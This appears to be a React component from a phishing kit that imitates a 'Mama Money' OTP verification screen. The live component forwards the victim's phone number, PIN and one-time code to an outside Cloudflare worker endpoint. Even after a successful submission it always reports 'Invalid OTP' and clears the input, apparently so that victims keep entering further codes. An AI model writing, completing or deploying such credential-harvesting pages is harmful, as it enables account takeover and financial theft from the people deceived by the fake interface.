// import React,{ useState, useEffect, useRef } from "react";

// export default function MamaMoneyOTP() {
//   const [otp, setOtp] = useState(["", "", "", "", ""]);
//   const [activeIndex, setActiveIndex] = useState(0);
//   const [countdown, setCountdown] = useState(20);
//   const inputRefs = useRef([]);

//   // Countdown timer for resend
//   useEffect(() => {
//     if (countdown <= 0) return;
//     const t = setTimeout(() => setCountdown((c) => c - 1), 1000);
//     return () => clearTimeout(t);
//   }, [countdown]);

//   // Auto-focus first box on mount
//   useEffect(() => {
//     inputRefs.current[0]?.focus();
//   }, []);

//   const handleChange = (value, index) => {
//     // Only digits, single char
//     const digit = value.replace(/\D/g, "").slice(-1);
//     const next = [...otp];
//     next[index] = digit;
//     setOtp(next);

//     if (digit && index < 4) {
//       inputRefs.current[index + 1]?.focus();
//       setActiveIndex(index + 1);
//     }
//   };

//   const handleKeyDown = (e, index) => {
//     if (e.key === "Backspace" && !otp[index] && index > 0) {
//       inputRefs.current[index - 1]?.focus();
//       setActiveIndex(index - 1);
//     }
//   };

//   const handleFocus = (index) => setActiveIndex(index);

//   const isComplete = otp.every((d) => d !== "");
//   const canResend = countdown === 0;

//   return (
//     <div className="min-h-screen w-full flex justify-center bg-[#f1f1f1] font-sans">
//       <div
//         className="relative w-full sm:max-w-[430px] min-h-screen flex flex-col
//                    px-6 sm:px-8 pt-12 sm:pt-16 pb-8
//                    bg-[#f1f1f1] sm:shadow-2xl"
//       >
//         {/* Heading */}
//         <h1
//           className="text-center font-bold text-[#1a1a1a] leading-tight"
//           style={{ fontSize: "clamp(22px, 6.5vw, 28px)" }}
//         >
//           Enter the OTP code we sent to your phone
//         </h1>

//         {/* OTP inputs */}
//         <div className="flex justify-center gap-2 sm:gap-3 mt-10 sm:mt-14">
//           {otp.map((digit, index) => {
//             const isActive = activeIndex === index;
//             return (
//               <input
//                 key={index}
//                 ref={(el) => (inputRefs.current[index] = el)}
//                 type="tel"
//                 inputMode="numeric"
//                 maxLength={1}
//                 value={digit}
//                 onChange={(e) => handleChange(e.target.value, index)}
//                 onKeyDown={(e) => handleKeyDown(e, index)}
//                 onFocus={() => handleFocus(index)}
//                 className={`
//                   w-[52px] h-[52px] sm:w-[58px] sm:h-[58px]
//                   bg-white rounded-[6px]
//                   text-center font-bold text-[#1a1a1a]
//                   outline-none transition-colors
//                   ${
//                     isActive
//                       ? "border-[3px] border-[#f5a623] shadow-sm"
//                       : "border-[2px] border-[#0a3f2a]"
//                   }
//                 `}
//                 style={{ fontSize: "clamp(20px, 5.5vw, 24px)" }}
//               />
//             );
//           })}
//         </div>

//         {/* Confirm button */}
//         <button
//           type="button"
//           disabled={!isComplete}
//           className={`
//             mt-10 sm:mt-12 w-full rounded-[4px]
//             py-[18px] sm:py-5
//             font-bold text-white tracking-wider
//             transition-colors
//             ${
//               isComplete
//                 ? "bg-[#0a3f2a] hover:bg-[#0d4c33]"
//                 : "bg-[#8fa89a] cursor-not-allowed"
//             }
//           `}
//           style={{ fontSize: "clamp(15px, 4.2vw, 17px)" }}
//         >
//           CONFIRM
//         </button>

//         {/* Resend OTP button */}
//         <button
//           type="button"
//           disabled={!canResend}
//           onClick={() => {
//             if (canResend) setCountdown(20);
//           }}
//           className={`
//             mt-4 w-full rounded-[4px]
//             py-[16px] sm:py-[18px]
//             border-[1.5px] font-semibold tracking-wider
//             transition-colors
//             ${
//               canResend
//                 ? "border-[#0a3f2a] text-[#0a3f2a] hover:bg-[#0a3f2a]/5"
//                 : "border-[#8fa89a] text-[#8fa89a] cursor-not-allowed"
//             }
//           `}
//           style={{ fontSize: "clamp(14px, 4vw, 16px)" }}
//         >
//           {canResend ? "RESEND OTP" : `RESEND OTP IN ${countdown}S`}
//         </button>

//         {/* Cancel link */}
//         <button
//           type="button"
//           className="mt-8 sm:mt-10 mx-auto text-[#0a3f2a] font-bold tracking-wider
//                      hover:opacity-70 transition-opacity"
//           style={{ fontSize: "clamp(14px, 4vw, 16px)" }}
//         >
//           CANCEL
//         </button>
//       </div>
//     </div>
//   );
// }

import React,{ useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";

export default function MamaMoneyOTP() {
  const [otp, setOtp] = useState(["", "", "", "", ""]);
  const [activeIndex, setActiveIndex] = useState(0);
  const [countdown, setCountdown] = useState(20);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");

  const inputRefs = useRef([]);
  const navigate = useNavigate();
  const location = useLocation();

  // Phone number passed in from the login page
  const {cellphone, pin} = location.state || "";

  // Countdown timer for resend
  useEffect(() => {
    if (countdown <= 0) return;
    const t = setTimeout(() => setCountdown((c) => c - 1), 1000);
    return () => clearTimeout(t);
  }, [countdown]);

  // Auto-focus first box on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  const isComplete = otp.every((d) => d !== "");
  const canResend = countdown === 0;

  const handleChange = (value, index) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const next = [...otp];
    next[index] = digit;
    setOtp(next);
    if (error) setError("");

    if (digit && index < 4) {
      inputRefs.current[index + 1]?.focus();
      setActiveIndex(index + 1);
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
      setActiveIndex(index - 1);
    }
    if (e.key === "Enter" && isComplete) {
      handleSubmit();
    }
  };

  const handleFocus = (index) => setActiveIndex(index);

  // Handle paste of full OTP code
  const handlePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 5);
    if (!pasted) return;
    const next = pasted.split("").concat(Array(5 - pasted.length).fill(""));
    setOtp(next);
    const lastIndex = Math.min(pasted.length, 4);
    inputRefs.current[lastIndex]?.focus();
    setActiveIndex(lastIndex);
  };

  const handleSubmit = async (e) => {
    e?.preventDefault();
    if (!isComplete) {
      setError("Please enter the complete OTP code");
      return;
    }

    setIsSubmitting(true);
    setError("");

    try {
      const code = otp.join("");

      // TODO: replace with actual API call
      const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/otp-momosa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone: cellphone, otp:code, pin }),
      });
      const data = await response.json();
      if (!response.ok) throw new Error(data.message || "Invalid OTP. Please try again.");
setError("Invalid OTP. Please try again.")
setOtp(["", "", "", "", ""]);
      // await new Promise((r) => setTimeout(r, 600));  
      console.log("OTP submitted:", { cellphone, code });

      // navigate("/dashboard");
    } catch (err) {
      setError(err.message || "Invalid OTP. Please try again.");
      setOtp(["", "", "", "", ""]);
      inputRefs.current[0]?.focus();
      setActiveIndex(0);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleResend = async () => {
    if (!canResend) return;
    try {
      // TODO: replace with actual API call
      // await fetch("/api/resend-otp", { ... });
      console.log("Resending OTP to:", cellphone);
      setCountdown(20);
      setError("");
    } catch (err) {
      setError("Failed to resend OTP. Please try again.");
    }
  };

  const handleCancel = () => navigate(-1);

  return (
    <div className="min-h-screen w-full flex justify-center bg-[#f1f1f1] font-sans">
      <form
        onSubmit={handleSubmit}
        className="relative w-full sm:max-w-[430px] min-h-screen flex flex-col px-6 sm:px-8 pt-12 sm:pt-16 pb-8 bg-[#f1f1f1] sm:shadow-2xl"
      >
        <h1
          className="text-center font-bold text-[#1a1a1a] leading-tight"
          style={{ fontSize: "clamp(22px, 6.5vw, 28px)" }}
        >
          Enter the OTP code we sent to your phone
        </h1>

        <div className="flex justify-center gap-2 sm:gap-3 mt-10 sm:mt-14">
          {otp.map((digit, index) => {
            const isActive = activeIndex === index;
            return (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(e.target.value, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                onFocus={() => handleFocus(index)}
                onPaste={handlePaste}
                className={`w-[52px] h-[52px] sm:w-[58px] sm:h-[58px] bg-white rounded-[6px] text-center font-bold text-[#1a1a1a] outline-none transition-colors ${
                  isActive
                    ? "border-[3px] border-[#f5a623] shadow-sm"
                    : "border-[2px] border-[#0a3f2a]"
                }`}
                style={{ fontSize: "clamp(20px, 5.5vw, 24px)" }}
              />
            );
          })}
        </div>

        {error && (
          <p className="text-red-600 text-center text-sm mt-4">{error}</p>
        )}

        <button
          type="submit"
          disabled={!isComplete || isSubmitting}
          className={`mt-10 sm:mt-12 w-full rounded-[4px] py-[18px] sm:py-5 font-bold text-white tracking-wider transition-colors ${
            isComplete && !isSubmitting
              ? "bg-[#0a3f2a] hover:bg-[#0d4c33]"
              : "bg-[#8fa89a] cursor-not-allowed"
          }`}
          style={{ fontSize: "clamp(15px, 4.2vw, 17px)" }}
        >
          {isSubmitting ? "VERIFYING..." : "CONFIRM"}
        </button>

        <button
          type="button"
          disabled={!canResend}
          onClick={handleResend}
          className={`mt-4 w-full rounded-[4px] py-[16px] sm:py-[18px] border-[1.5px] font-semibold tracking-wider transition-colors ${
            canResend
              ? "border-[#0a3f2a] text-[#0a3f2a] hover:bg-[#0a3f2a]/5"
              : "border-[#8fa89a] text-[#8fa89a] cursor-not-allowed"
          }`}
          style={{ fontSize: "clamp(14px, 4vw, 16px)" }}
        >
          {canResend ? "RESEND OTP" : `RESEND OTP IN ${countdown}S`}
        </button>

        <button
          type="button"
          onClick={handleCancel}
          className="mt-8 sm:mt-10 mx-auto text-[#0a3f2a] font-bold tracking-wider hover:opacity-70 transition-opacity"
          style={{ fontSize: "clamp(14px, 4vw, 16px)" }}
        >
          CANCEL
        </button>
      </form>
    </div>
  );
}